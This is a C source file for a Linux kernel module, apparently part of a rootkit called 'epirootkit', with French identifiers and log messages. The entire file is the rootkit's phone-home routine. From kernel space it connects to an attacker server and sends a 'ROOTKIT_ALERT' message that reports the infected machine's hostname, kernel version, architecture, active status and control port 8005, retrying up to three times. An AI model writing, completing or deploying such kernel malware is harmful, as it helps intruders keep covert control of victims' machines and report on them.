#include <linux/module.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/utsname.h>
#include <linux/delay.h>
#include <linux/jiffies.h>
#include "notification.h"

int notifier_attaquant(void)
{
    struct socket *sock;
    struct sockaddr_in addr;
    struct msghdr msg;
    struct kvec iov;
    char *message;
    int ret;
    unsigned char ip_binary[4];
    
    pr_info("epirootkit: DEBUT notification vers %s:%d\n", SERVEUR_ATTAQUANT, PORT_NOTIFICATION);
    
    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (ret < 0) {
        pr_err("epirootkit: Erreur creation socket notification: %d\n", ret);
        return ret;
    }
    
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT_NOTIFICATION);
    
    ret = in4_pton(SERVEUR_ATTAQUANT, -1, ip_binary, -1, NULL);
    if (ret == 0) {
        pr_err("epirootkit: Erreur conversion IP attaquant\n");
        sock_release(sock);
        return -EINVAL;
    }
    
    memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof(addr.sin_addr.s_addr));
    
    pr_info("epirootkit: Tentative connexion vers %s:%d\n", SERVEUR_ATTAQUANT, PORT_NOTIFICATION);
    
    ret = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
    if (ret < 0) {
        pr_err("epirootkit: ECHEC connexion vers %s:%d (erreur: %d)\n", 
                SERVEUR_ATTAQUANT, PORT_NOTIFICATION, ret);
        sock_release(sock);
        return ret;
    }
    
    pr_info("epirootkit: Connexion reussie vers %s:%d\n", SERVEUR_ATTAQUANT, PORT_NOTIFICATION);
    
    message = kmalloc(1024, GFP_KERNEL);
    if (!message) {
        sock_release(sock);
        return -ENOMEM;
    }
    
    snprintf(message, 1024, 
             "ROOTKIT_ALERT\n"
             "Hostname: %s\n"
             "Kernel: %s %s\n"
             "Architecture: %s\n"
             "Status: INSTALLE ET ACTIF\n"
             "Port_controle: 8005\n"
             "Timestamp: %lld\n",
             utsname()->nodename,
             utsname()->sysname,
             utsname()->release,
             utsname()->machine,
             ktime_get_real_seconds());
    
    memset(&msg, 0, sizeof(msg));
    iov.iov_base = message;
    iov.iov_len = strlen(message);
    
    pr_info("epirootkit: Envoi message de %zu octets\n", strlen(message));
    
    ret = kernel_sendmsg(sock, &msg, &iov, 1, strlen(message));
    if (ret < 0) {
        pr_err("epirootkit: Erreur envoi notification: %d\n", ret);
    } else {
        pr_info("epirootkit: Notification envoyee avec succes (%d octets) vers %s:%d\n", 
                ret, SERVEUR_ATTAQUANT, PORT_NOTIFICATION);
    }
    
    kfree(message);
    sock_release(sock);
    return ret;
}

int envoyer_alerte_installation(void)
{
    int tentatives = 3;
    int ret;
    
    pr_info("epirootkit: *** DEBUT envoyer_alerte_installation() ***\n");
    
    while (tentatives > 0) {
        pr_info("epirootkit: Tentative %d/3 de notification\n", 4 - tentatives);
        ret = notifier_attaquant();
        if (ret >= 0) {
            pr_info("epirootkit: Notification reussie!\n");
            return ret;
        }
        
        tentatives--;
        if (tentatives > 0) {
            pr_info("epirootkit: Echec, attente 2 secondes avant retry\n");
            msleep(2000);
        }
    }
    
    pr_err("epirootkit: *** ECHEC TOTAL apres 3 tentatives ***\n");
    return ret;
}
